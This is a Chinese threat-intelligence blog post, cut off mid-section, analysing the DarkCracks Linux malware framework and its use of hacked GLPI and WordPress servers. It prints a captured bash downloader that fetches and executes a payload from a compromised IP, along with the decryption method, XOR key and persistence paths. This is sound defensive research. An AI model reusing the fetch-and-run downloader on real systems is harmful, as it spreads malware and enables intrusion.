<!DOCTYPE html>
<html lang="zh-CN">
<head>

    <title>DarkCracks, 一个利用被黑GLPI, WORDPRESS站点充当中转的高级恶意载荷&amp;升级框架</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=256e1729b4" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=256e1729b4" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=256e1729b4" />

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.css">

    <style>
        .gh-sidebar{
            width: 300px;
            left: -40px;
        }
        .gh-content ol ol li{
            list-style-type: none;
        }
        .gh-content {
            position: relative;
        }

        .gh-toc > .toc-list {
            position: relative;
            font-size: 12px;
             
        }

        .toc-list {
            overflow: hidden;
            list-style: none;
        }

        @media (min-width: 1300px) {
            .gh-sidebar {
                position: absolute; 
                top: 0;
                bottom: 0;
                margin-top: 4vmin;
                grid-column: wide-start / main-start; /* Place the TOC to the left of the content */
            }
        
            .gh-toc {
                position: sticky; /* On larger screens, TOC will stay in the same spot on the page */
                top: 4vmin;
            }
        }

        .gh-toc .is-active-link::before {
            background-color: var(--ghost-accent-color); /* Defines TOC   accent color based on Accent color set in Ghost Admin */
        } 
    </style>

    <link rel="icon" href="https://blog.xlab.qianxin.com/content/images/size/w256h256/2023/10/xlab-icon-1.png" type="image/png">
    <link rel="canonical" href="https://blog.xlab.qianxin.com/uncovering_darkcracks_payload_delivery_framework_cn/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="奇安信 X 实验室">
    <meta property="og:type" content="article">
    <meta property="og:title" content="DarkCracks, 一个利用被黑GLPI, WORDPRESS站点充当中转的高级恶意载荷&amp;升级框架">
    <meta property="og:description" content="摘要


我们的XLab大网威胁感知系统最近捕获了一个VirusTotal 0检测, 高持续、高隐匿、高完善升级设计、并利用高性能稳定在线设备作为其基础设施的恶意载荷投递&amp;升级框架系统。


从我们的数据来看，这个我们命名为DarkCracks的恶意程序设计精良，背后的攻击者绝非普通的脚本小子。虽然我们对他的载荷投递&amp;升级框架体系已经掌握，但由于高隐匿性，它的Launcher组件我们截止目前尚无显著视野。


不过在8月26日，我们看到在该项目的开发文件中新增一个受密码保护的名字resume的PDF文件，随后该文件被重命名为韩文김영미 이력서 (Kim Young-mi&#x27;s resume)，考虑到这是一个较为常见的韩文名字，我们高度怀疑这个组件的一部分功能是针对韩语用户群体的社工活动。


DarkCracks利用被黑的GLPI, WORDPRESS站点充当Downloader &amp; C2，收集被入侵设备敏感信息，维持被入侵设备的长期访问权限，并利用这些设备作为中间节点控制其他设备或投递恶意载荷以隐匿攻击者痕迹。我们视野范围内的分布在不同国家的学校网站，公交系统，甚至监狱访客系统等公众服">
    <meta property="og:url" content="https://blog.xlab.qianxin.com/uncovering_darkcracks_payload_delivery_framework_cn/">
    <meta property="og:image" content="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_brief.webp">
    <meta property="article:published_time" content="2024-08-31T11:38:00.000Z">
    <meta property="article:modified_time" content="2024-09-04T04:13:23.000Z">
    <meta property="article:tag" content="Botnet">
    <meta property="article:tag" content="DGA">
    <meta property="article:tag" content="CN">
    <meta property="article:tag" content="Backdoor">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="DarkCracks, 一个利用被黑GLPI, WORDPRESS站点充当中转的高级恶意载荷&amp;升级框架">
    <meta name="twitter:description" content="摘要


我们的XLab大网威胁感知系统最近捕获了一个VirusTotal 0检测, 高持续、高隐匿、高完善升级设计、并利用高性能稳定在线设备作为其基础设施的恶意载荷投递&amp;升级框架系统。


从我们的数据来看，这个我们命名为DarkCracks的恶意程序设计精良，背后的攻击者绝非普通的脚本小子。虽然我们对他的载荷投递&amp;升级框架体系已经掌握，但由于高隐匿性，它的Launcher组件我们截止目前尚无显著视野。


不过在8月26日，我们看到在该项目的开发文件中新增一个受密码保护的名字resume的PDF文件，随后该文件被重命名为韩文김영미 이력서 (Kim Young-mi&#x27;s resume)，考虑到这是一个较为常见的韩文名字，我们高度怀疑这个组件的一部分功能是针对韩语用户群体的社工活动。


DarkCracks利用被黑的GLPI, WORDPRESS站点充当Downloader &amp; C2，收集被入侵设备敏感信息，维持被入侵设备的长期访问权限，并利用这些设备作为中间节点控制其他设备或投递恶意载荷以隐匿攻击者痕迹。我们视野范围内的分布在不同国家的学校网站，公交系统，甚至监狱访客系统等公众服">
    <meta name="twitter:url" content="https://blog.xlab.qianxin.com/uncovering_darkcracks_payload_delivery_framework_cn/">
    <meta name="twitter:image" content="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_brief.webp">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Alex.Turing">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Botnet, DGA, CN, Backdoor">
    <meta name="twitter:site" content="@Xlab_qax">
    <meta name="twitter:creator" content="@TuringAlex">
    <meta property="og:image:width" content="1792">
    <meta property="og:image:height" content="1024">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "奇安信 X 实验室",
        "url": "https://blog.xlab.qianxin.com/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.xlab.qianxin.com/content/images/size/w256h256/2023/10/xlab-icon-1.png",
            "width": 60,
            "height": 60
        }
    },
    "author": {
        "@type": "Person",
        "name": "Alex.Turing",
        "image": {
            "@type": "ImageObject",
            "url": "https://blog.xlab.qianxin.com/content/images/2023/08/turing.png",
            "width": 1363,
            "height": 1363
        },
        "url": "https://blog.xlab.qianxin.com/author/alex/",
        "sameAs": [
            "https://twitter.com/TuringAlex"
        ]
    },
    "headline": "DarkCracks, 一个利用被黑GLPI, WORDPRESS站点充当中转的高级恶意载荷&amp;升级框架",
    "url": "https://blog.xlab.qianxin.com/uncovering_darkcracks_payload_delivery_framework_cn/",
    "datePublished": "2024-08-31T11:38:00.000Z",
    "dateModified": "2024-09-04T04:13:23.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_brief.webp",
        "width": 1792,
        "height": 1024
    },
    "keywords": "Botnet, DGA, CN, Backdoor",
    "description": "摘要\n\n\n我们的XLab大网威胁感知系统最近捕获了一个VirusTotal 0检测, 高持续、高隐匿、高完善升级设计、并利用高性能稳定在线设备作为其基础设施的恶意载荷投递&amp;升级框架系统。\n\n\n从我们的数据来看，这个我们命名为DarkCracks的恶意程序设计精良，背后的攻击者绝非普通的脚本小子。虽然我们对他的载荷投递&amp;升级框架体系已经掌握，但由于高隐匿性，它的Launcher组件我们截止目前尚无显著视野。\n\n\n不过在8月26日，我们看到在该项目的开发文件中新增一个受密码保护的名字resume的PDF文件，随后该文件被重命名为韩文김영미 이력서 (Kim Young-mi&#x27;s resume)，考虑到这是一个较为常见的韩文名字，我们高度怀疑这个组件的一部分功能是针对韩语用户群体的社工活动。\n\n\nDarkCracks利用被黑的GLPI, WORDPRESS站点充当Downloader &amp; C2，收集被入侵设备敏感信息，维持被入侵设备的长期访问权限，并利用这些设备作为中间节点控制其他设备或投递恶意载荷以隐匿攻击者痕迹。我们视野范围内的分布在不同国家的学校网站，公交系统，甚至监狱访客系统等公众服",
    "mainEntityOfPage": "https://blog.xlab.qianxin.com/uncovering_darkcracks_payload_delivery_framework_cn/"
}
    </script>

    <meta name="generator" content="Ghost 5.70">
    <link rel="alternate" type="application/rss+xml" title="奇安信 X 实验室" href="https://blog.xlab.qianxin.com/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="85bfb974adb4cf4f0cda2658c7" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://blog.xlab.qianxin.com/" crossorigin="anonymous"></script>
    
    <link href="https://blog.xlab.qianxin.com/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=256e1729b4"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=256e1729b4">
    <script defer src="/public/comment-counts.min.js?v=256e1729b4" data-ghost-comments-counts-api="https://blog.xlab.qianxin.com/members/api/comments/counts/"></script>
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-8T4S62VBFD"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-8T4S62VBFD');
</script>
<style>:root {--ghost-accent-color: #4ca2ba;}</style>

</head>
<body class="post-template tag-botnet tag-dga tag-cn tag-backdoor is-head-middle-logo has-serif-title has-sans-body has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo no-image" href="https://blog.xlab.qianxin.com">
                        奇安信 X 实验室
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="https://blog.xlab.qianxin.com/">Home</a></li>
    <li class="nav-about"><a href="https://blog.xlab.qianxin.com/about/">About</a></li>
    <li class="nav-en"><a href="https://blog.xlab.qianxin.com/tag/en/">EN</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        



<main id="site-main" class="site-main">
<article class="article post tag-botnet tag-dga tag-cn tag-backdoor ">

    <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
                <span class="post-card-primary-tag">
                    <a href="/tag/botnet/">Botnet</a>
                </span>
        </div>

        <h1 class="article-title">DarkCracks, 一个利用被黑GLPI, WORDPRESS站点充当中转的高级恶意载荷&amp;升级框架</h1>


        <div class="article-byline">
        <section class="article-byline-content">

            <ul class="author-list">
                <li class="author-list-item">
                    <a href="/author/alex/" class="author-avatar">
                        <img class="author-profile-image" src="/content/images/size/w100/2023/08/turing.png" alt="Alex.Turing" />
                    </a>
                </li>
                <li class="author-list-item">
                    <a href="/author/acey9/" class="author-avatar">
                        <img class="author-profile-image" src="/content/images/size/w100/2023/11/3346712.jpeg" alt="Acey9" />
                    </a>
                </li>
                <li class="author-list-item">
                    <a href="/author/tf0xn/" class="author-avatar">
                        <img class="author-profile-image" src="/content/images/size/w100/2024/08/1.jpg" alt="TF0xn" />
                    </a>
                </li>
            </ul>

            <div class="article-byline-meta">
                <h4 class="author-name"><a href="/author/alex/">Alex.Turing</a>, <a href="/author/acey9/">Acey9</a>, <a href="/author/tf0xn/">TF0xn</a></h4>
                <div class="byline-meta-content">
                    <time class="byline-meta-date" datetime="2024-08-31">2024年8月31日</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 29 min read</span>
                </div>
            </div>

        </section>
        </div>

            <figure class="article-image">
                <img
                    src="/content/images/size/w2000/2024/08/smartupdate_brief.webp"
                    alt="DarkCracks, 一个利用被黑GLPI, WORDPRESS站点充当中转的高级恶意载荷&amp;升级框架"
                />
            </figure>

    </header>

    <section class="gh-content gh-canvas">
        <aside class="gh-sidebar"><div class="gh-toc"></div></aside> 
        <h1 id="%E6%91%98%E8%A6%81">摘要</h1>
<p>我们的XLab大网威胁感知系统最近捕获了一个VirusTotal 0检测, 高持续、高隐匿、高完善升级设计、并利用高性能稳定在线设备作为其基础设施的恶意载荷投递&amp;升级框架系统。</p>
<p>从我们的数据来看，这个我们命名为<strong>DarkCracks</strong>的恶意程序设计精良，背后的攻击者绝非普通的脚本小子。虽然我们对他的载荷投递&amp;升级框架体系已经掌握，但由于高隐匿性，它的Launcher组件我们截止目前尚无显著视野。</p>
<p>不过在8月26日，我们看到在该项目的开发文件中新增一个受密码保护的名字resume的PDF文件，随后该文件被重命名为韩文<code>김영미 이력서 (Kim Young-mi's resume)</code>，考虑到这是一个较为常见的韩文名字，我们高度怀疑这个组件的一部分功能是针对韩语用户群体的社工活动。</p>
<p>DarkCracks利用被黑的GLPI, WORDPRESS站点充当Downloader &amp; C2，收集被入侵设备敏感信息，维持被入侵设备的长期访问权限，并利用这些设备作为中间节点控制其他设备或投递恶意载荷以隐匿攻击者痕迹。我们视野范围内的分布在<strong>不同国家</strong>的<strong>学校网站，公交系统，甚至监狱访客系统</strong>等公众服务系统都是被害对象。</p>
<h1 id="%E5%8F%91%E7%8E%B0%E4%B9%8B%E6%97%85">发现之旅</h1>
<p>2024年6月5日，<code>XLab大网威胁感知系统</code>对ELF文件8b3d2b156424e5a0dc3f6d2b0dec96b2的网络流量发出<strong>ELF_Downloader</strong>告警，该流量为HTTP类型，下载路径为<code>/vendor/sabre/event/lib/Promise/wk8dnj2k-x64-musl</code>，路径层级非常深，高度疑似被黑，这引起了我们的关注。经过分析，我们确认下载服务器<strong>45.169.87.67</strong>被黑客入侵，攻击面为该IP上运行的<strong>GLPI</strong>系统。<code>wk8dnj2k-x64-musl</code>是一个Runner，它的功能是解密参数指定的的JSON格式配置文件，下载，解密并执行<strong>clientUrl</strong>字段指定的Client；而Client的功能则是上报被侵入设备的信息，被C2下发的配置文件驱动，下载更新Runner，Client，Launcher等组件。目前Runner，Client组件在VirusTotal都是<strong>0检测</strong>，它们已在安全产商的眼皮底下<strong>偷摸活动超过一年时间</strong>。</p>
<p>2024年6月12日，另一个下载脚本f8a495a98c43b0805f53be14db09c409进入我们的视野，它使用的下载路径为<code>/vendor/sebastian/diff/src/Exception/pQ1iM9hd-x64-musl</code>。该文件与上述的wk8dnj2k-x64-musl高度相似；同样下载服务器 <strong>179.191.68.85</strong>也提供<strong>GLPI</strong>服务。</p>
<p><code>“相似的文件,不同的文件名，托管在不同的服务器&amp;不同的路径”</code> 这一异常现象很明显的说明在野存在未知的攻击者正在入侵GLPI系统，并利用攻陷的设备做为基础设施，承载其网络犯罪活动。为了理清源头，我们展开了溯源工作，最终在<code>样本，配置文件，C2，攻击目标</code>等方面都有所发现。</p>
<ol>
<li>
<p>多个被攻陷的系统背后的主机隶属于不同国家的<strong>关键基础设施</strong>，如<code>学校网站，公交系统，监狱访客系统</code>等。</p>
</li>
<li>
<p>通过XLab指令跟踪系统中捕获更换C2指令，新的C2是被黑的WORD PRESS站点。</p>
</li>
<li>
<p>在Github上发现存储配置文件的项目soduku1，创建时间为2023年7月11日。</p>
</li>
<li>
<p>在VirusTotal上发现与Client同源的ELF文件c447f7980a18205f309d8432f312fe69 ，此文件中的带有源码路径<code>/home/erin/Desktop/Works/smart-update/SmartUpdate/client</code>。</p>
</li>
<li>
<p>XLab主动联系受害者，获得C2 Panel，最终掌握了"管理员模式"的运行机制。</p>
</li>
<li>
<p>在Github上发现另一项目ftMQPwsMnB，包含诱饵文件<code>김영미 이력서</code>，以及QuasarRAT。</p>
</li>
</ol>
<p>综上所述，一个至少活跃了1年以上，设计精良的恶意载荷投递&amp;升级框架在我们眼前变得清晰，它利用被黑的GLPI, WORDPRESS站点充当Downloader &amp; C2，主要目的是收集被入侵设备敏感信息，维持被入侵设备的长期访问权限，利用稳定高性能被入侵设备作为中间节点控制其他设备或投递恶意载荷以隐匿攻击者痕迹。<code>高持续、高隐匿、高完善的升级设计、挑选高性能稳定在线设备作为其基础设施</code>等迹象表明该框架背后的攻击者并非普通的脚本小子。基于样本中使用的xor秘钥<code>Crackalackin</code>，我们内部将这个框架称为DarkCracks。尽管目前我们尚未捕获到Launcher组件，无法感知DarkCracks的进一步活动，但长达一年以上时间的活动未被安全产品感知和检出足以说明其攻击手段的隐匿和高效。这值得我们警惕，为此我们撰写了本文，向安全社区分享发现。</p>
<h1 id="%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87">攻击目标</h1>
<p>DarkCracks 根据受害者设备的性能差异分配不同角色：性能强劲的设备承担基础设施角色，如 C2 和 Downloader；而性能较弱的设备则充当 Bot 业务节点。</p>
<p>DarkCracks 的一类攻击目标是Word Press以及GLPI。WordPress，一个世界知名的web内容管理系统，此处就再不展开；而相对冷门的GLPI（Gestionnaire Libre de Parc Informatique）是一款开源的 IT 资产管理和服务管理系统，它主要用于帮助组织管理其信息技术资产，包括硬件、软件、网络设备等。该系统广泛应用于中小型企业、教育机构和政府部门，以提高 IT 基础设施的管理和维护效率。</p>
<p>在我们观察到的13个C2/Downloader中(被入侵的设备)，涉及不同国家的城市公交系统、监狱访客预约系统、金融机构等重要机构。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_glpivictims.png" alt="smartupdate_glpivictims.png" loading="lazy"></p>
<p>根据<strong>奇安信鹰图</strong>的统计，近一个月暴露在公网上的GLPI服务数字为10157，请使用此系统的相关企业积极排查，保持警惕。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_statis.png" alt="smartupdate_statis.png" loading="lazy"></p>
<h1 id="%E6%97%B6%E9%97%B4%E7%BA%BF">时间线</h1>
<p>根据我们掌握的线索，我们整理了以下 DarkCracks 的活动时间线。需要注意的是，这仅基于我们现有的情报，DarkCracks 的实际活动可能早于此时间线。</p>
<ul>
<li>2023.07.11，adrhpbrn29创建项目soduku1，用于存储备用配置文件。</li>
<li>2023.07.18，未加密的Client从中国被上传到VT，敏感字串未被加密。</li>
<li>2024.05.23，Runner样本先后从波兰、韩国、荷兰、英国、德国和美国上传到VirusTotal，其中的敏感字符串已全部加密。</li>
<li>2024.06.05，DarkCracks Downloader首次进入视野，XLab发现45.169.87.67被黑，提供众多Runner(包含05.23)，配置文件，Client下载。</li>
<li>2024.06.06，完成对Runner的分析，成功解密配置文件与Client，发现备用配置保存在github，版本号为<code>SUC 2.0</code>，部分CPU架构样本支持DGA。</li>
<li>2024.06.10，捕获更新C2指令，新的C2为被黑的Word Press站点。</li>
<li>2024.06.12，发现179.191.68.85被黑，充当DarkCracks的下载服务器，备用配置保存在pastebin，版本号为<code>SUC 2.01</code>，全系CPU架构支持DGA。</li>
<li>2024.06.14，受害者向XLab提供黑客在其设备的留下的implants，包括c2 panel，配置文件等。</li>
<li>2024.07.23，另一Runner样本先后从芬兰，日本和美国上传到VT，敏感字串未被加密，不支持DGA。</li>
<li>2024.08.23，adrhpbrn29创建项目ftMQPwsMnB，传播远控木马QuasarRAT。</li>
</ul>
<h1 id="%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82">技术细节</h1>
<p>接下来，我们将从Downloader开始，逐步引出Darkcracks关键组件：Runner、Client、Launcher以及C2 Panel。通过对各个组件功能的详细分析，我们将理清框架的设计原理，揭示Darkcracks是如何利用这些组件隐秘的实现Payload投递。</p>
<h2 id="part1-downloader%E5%88%86%E6%9E%90">Part1: Downloader分析</h2>
<p>关于Downloader，我们观察到2种不同的形式，一种是Metasplit Stagers，它首先接收shellcode构建shell执行环境，然后执行wget下载；另一种则是bash脚本，直接通过wget/curl下载。</p>
<h3 id="0x01-metasploit-stager">0x01: Metasploit Stager</h3>
<pre><code>  MD5: 8b3d2b156424e5a0dc3f6d2b0dec96b2
  Magic: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked
</code></pre>
<p>Stager与213.139.233.163:18441通信，产生的网络流量如下所示，它的目的是向45.169.87.67请求wk8dnj2k-x64-musl。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/07/smartupdate_meta.png" alt="smartupdate_meta.png" loading="lazy"></p>
<p>wk8dnj2k正是DarkCracks的Runner组件，在45.169.87.67我们发现了gnu, uclibc，musl等编译器产生的ARM,MIPS,X86/64 CPU架构的Runner <code>wk8dnj2k-{cpu}-{compiler}</code>，加密的Client <code>se3hf6jwc-{cpu}-{compiler}</code>，以及加密的配置文件<code>qoakeifm-unknown.txt</code>。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/07/smartupdate_45.png" alt="smartupdate_45.png" loading="lazy"></p>
<h3 id="0x02-bash-script">0x02: Bash Script</h3>
<pre><code>MD5: f8a495a98c43b0805f53be14db09c409
Magic: Bourne-Again shell script text executable
</code></pre>
<p>Script的功能一目了然，向179.191.68.85请求<code>pQ1iM9hd-x64-musl</code>以及<code>j8UgL3v</code>；其中前者为Runner，后者为加密的配置文件。</p>
<pre><code>#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
wget "http://179.191.68.85:82/vendor/sebastian/diff/src/Exception/pQ1iM9hd-x64-musl" -O wdvsh|curl "http://179.191.68.85:82/vendor/sebastian/diff/src/Exception/pQ1iM9hd-x64-musl" -o wdvsh;
wget http://179.191.68.85:82/vendor/sebastian/diff/src/Exception/j8UgL3v -O agr|curl http://179.191.68.85:82/vendor/sebastian/diff/src/Exception/j8UgL3v -o agr;

chmod +x ./wdvsh;
./wdvsh agr;

sleep 3;
rm ./wdvsh;
rm ./agr;
</code></pre>
<p>同样179.191.68.85上也保存着Darkcracks的各种CPU架构的不同实体。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/07/smartupdate_179.png" alt="smartupdate_179.png" loading="lazy"></p>
<h2 id="part2-runner%E5%88%86%E6%9E%90">Part2: Runner分析</h2>
<p>45.169.87.67承载的Runner wk8dnj2k-{cpu}{compiler}，版本号为2.0；179.191.68.85中的pQ1iM9hd系列版本号为2.01，它们之间的差异非常小，本文以wk8dnj2k X64 Cpu架构的Runner为主要分析对象，以下为它的基本信息：</p>
<pre><code>Name: wk8dnj2k-x64
MD5: 93a7cba1edbacb633021ebc38c10a79f
Magic:ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.2.0, stripped
</code></pre>
<p>正如其名称所示，Runner的主要功能是充当启动器，负责下载、解密并执行 Client。具体来说，当 Runner 运行时，它首先检查运行参数，并且最多支持一个参数，即一个加密的 JSON 格式配置文件。合法的配置文件在解密后至少需要包含以下三个字段：<code>key</code>（解密 Client 所需的密钥和 IV）、<code>emUrl</code>（备用配置文件的下载地址）以及 <code>clientUrl</code>（加密 Client 的下载地址）。</p>
<p>在配置文件通过合法性验证后，Runner会创建工作目录 <code>/var/tmp/.shm</code>，将自身移动到该目录，并重命名为一个 UUID 格式的文件名。接着生成一个新的加密文件 <code>2b6f92be-6ff1-4b6d-98ce-f5597c69f4b1</code>，该文件的 <code>SH3</code> 字段保存了原始配置文件的内容。随后通过 <code>crontab</code>、<code>bash_profile</code> 或 <code>/etc/init.d/rnd</code> 等方式实现持久化。最后下载、解密并执行 Client。</p>
<p>如果未指定参数，Runner将检查是否存在文件 <code>/var/tmp/.shm/2b6f92be-6ff1-4b6d-98ce-f5597c69f4b1</code>，通过 <code>SH3</code> 字段获取配置文件，然后进入解密配置文件、下载并执行 Client 的流程。</p>
<h3 id="%E8%A7%A3%E5%AF%86%E5%AD%97%E4%B8%B2%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">解密字串&amp;配置文件</h3>
<h3 id="0x01-%E6%95%8F%E6%84%9F%E5%AD%97%E4%B8%B2">0x01: 敏感字串</h3>
<p>为了保护功能不被一眼看破，Runner将敏感的字串都进行预先的加密处理；当需要使用时则通过decstr函数进行解密。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_decstr.png" alt="smartupdate_decstr.png" loading="lazy"></p>
<p>该如何解密字符串呢？可以直接使用flare_emu对decstr函数进行模拟执行，以密文“9MwEVEVWWExM5AkO”为例，它对应的明文是“clientUrl”。</p>
<pre><code>import flare_emu
def ignorefree(eh, address, argv, funcName, userData):
    eh.uc.reg_write(eh.regs["rax"], 0)

ciphertxt=b'9MwEVEVWWExM5AkO'
eh=flare_emu.EmuHelper()
eh.apiHooks['free']=ignorefree
eh.emulateRange(startAddr=0x00000000000F9D0,skipCalls=False,registers={'rdi':ciphertxt})

print(eh.getEmuString(eh.getRegVal('ret')))
</code></pre>
<p>当然作为安全分析肯定不会满足黑盒式的解密，经过分析，decstr函数的解密逻辑可以分成以下3步。</p>
<ol>
<li>字串逆序列，Base64 URLSafe模式解码</li>
<li>与<code>Crackalackin'</code>逐字节异或</li>
<li>英文字母大小写互换，Base64 URLSafe模式解码</li>
</ol>
<p>最终我们实现了附录中的IDAPython脚本用于还原加密字串，并将密文进行patch，效果如下所示，此时再进行逆向分析就方便的多了。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_afterdec.png" alt="smartupdate_afterdec.png" loading="lazy"></p>
<h3 id="0x02-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">0x02: 配置文件</h3>
<p>关于配置文件，我们一共捕获了2份，qoakeifm-unknown和j8UgL3v。配置文件使用了和敏感字串相同的加密方式，解密后如下所示，值得注意的是emUrl指定向的备用配置储存在github，pasterbin俩个第3方内容托管平台。</p>
<ul>
<li>
<p>45.169.87.67中的配置文件qoakeifm-unknown<br>
<img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_qoak.png" alt="smartupdate_qoak.png" loading="lazy"></p>
</li>
<li>
<p>179.191.68.85中的配置文件j8UgL3v</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_j8ug.png" alt="smartupdate_j8ug.png" loading="lazy"></p>
</li>
</ul>
<p>配置文件中各字段的说明见下表：</p>
<table>
<thead>
<tr>
<th>Item</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>key</td>
<td>AES KEY&amp;IV</td>
</tr>
<tr>
<td>url</td>
<td>Client Report Entry</td>
</tr>
<tr>
<td>authHeader</td>
<td>Auth String</td>
</tr>
<tr>
<td>emUrl</td>
<td>Backup Config</td>
</tr>
<tr>
<td>runnerUrl</td>
<td>Runner Download URL</td>
</tr>
<tr>
<td>clientUrl</td>
<td>Client Download URL</td>
</tr>
</tbody>
</table>
<h3 id="%E6%96%87%E4%BB%B6%E4%BC%AA%E8%A3%85%E6%8C%81%E4%B9%85%E5%8C%96">文件伪装&amp;持久化</h3>
<p>当合法的配置文件成功解密后，Runner会创建工作目录/var/tmp/.shm，并将自身移动到该目录，重命名为UUID格式的文件名，并重新生成一个加密的配置文件，2b6f92be-6ff1-4b6d-98ce-f5597c69f4b1。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_2b6.png" alt="smartupdate_2b6.png" loading="lazy"></p>
<p>2b6f92be-6ff1-4b6d-98ce-f5597c69f4b1也是JSON格式，其中<code>SH1</code>的内容为UUID的文件名，<code>SH3</code>的内容为原始配置文件。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_sh1sh3.png" alt="smartupdate_sh1sh3" loading="lazy"></p>
<p>当Runner完成文件伪装之后，接着使用以下任意一种方式实现持久化。</p>
<ol>
<li>
<p>若设备支持crontab，直接使用<code>crontab</code>实现持久化。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_crontab.png" alt="smartupdate_crontab" loading="lazy"></p>
</li>
<li>
<p>若1不满足，且当前用户组为普通用户，通过<code>.bash_profile</code>实现持久化。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_bash.png" alt="smartupdate_bash" loading="lazy"></p>
</li>
<li>
<p>若1不满足，且当前用户组为root用户，通过<code>/etc/init.d/rnd</code>实现持久化。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_initd.png" alt="smartupdate_initd" loading="lazy"></p>
</li>
</ol>
<h3 id="%E4%B8%8B%E8%BD%BD%E5%8A%A0%E5%AF%86%E7%9A%84client">下载加密的Client</h3>
<p>Runner使用一个永真的的代码片段依次向3类不同的URL尝试下载加密的Client，任一成功就跳出循环；否则就休眼6到18小时，再进行下一次尝试。这种模式被我们称之为3层URL任务轮询。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_3try.png" alt="smartupdate_3try.png" loading="lazy"></p>
<p>其中clienturl属于直接模式，只需要将其与样本的cpu架构字串拼接，就能得到Client的下载地址；而emurl和dgaurl则属间接模式，它们首先下载url指向的页面，通过<code>seed_string</code>字串定位其中的备用配置文件信息，然后将其解密进而获得新的clienturl。很明显clienturl，emurl，dgaurl 三者构成了一个多层级的冗余结构，第一层的clienturl通常指向被黑的站点，这类资产无疑是不稳定的，随时可能被清理；于是有了第2云的emurl，指向第3方的信息托管平台，稳定性更强，但依然有被封禁的风险；最终有了dgaurl，当前俩层url失效时，通过算法每月生成不同的域名做为最后的保障。</p>
<h3 id="0x01emurl">0x01:EmUrl</h3>
<p>clienturl的处理过程很简单，此处不再赘，让我们聚焦于emurl&amp;dagurl的处理逻辑。以配置文件qoakeifm-unknown中的emurl <code>https://raw.githubusercontent.com/adrhpbrn29/sudoku1/main/main.cpp</code>为例，以下为保存在变量seed_string中的备用配置。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_seed.png" alt="smartupdate_seed" loading="lazy"></p>
<p>seed_string中的备用配置解密后如下所示，Runner获得clienturl之后再度进入直接下载模式。</p>
